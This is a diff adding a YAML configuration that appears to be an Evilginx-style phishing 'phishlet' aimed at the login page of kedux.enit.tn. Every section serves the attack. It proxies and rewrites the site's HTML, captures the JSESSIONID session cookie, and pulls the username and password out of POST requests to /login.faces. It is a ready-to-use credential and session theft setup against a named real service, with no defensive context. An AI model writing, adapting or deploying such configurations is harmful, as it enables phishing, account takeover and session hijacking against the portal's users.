@@ -1,0 +1,23 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'kedux', orig_sub: 'kedux', domain: 'enit.tn', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'enit.tn', orig_sub: 'kedux', domain: 'enit.tn', search: 'kedux.enit.tn', replace: '{{.RootDomain}}', mimes: ['text/html']}
+#  - {triggers_on: 'enit.tn', orig_sub: 'kedux', domain: 'enit.tn', search: 'enit.tn', replace: '{{.RootDomain}}', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'kedux.enit.tn'
+    keys: ['JSESSIONID:always', 'org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE:always']
+#  - domain: '.enit.tn'
+#    keys: ['JSESSIONID:always', 'org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE:always']
+credentials:
+  username:
+    key: 'username' 
+    search: '(.*)'
+    type: 'post'   
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'kedux.enit.tn'
+  path: '/login.faces'
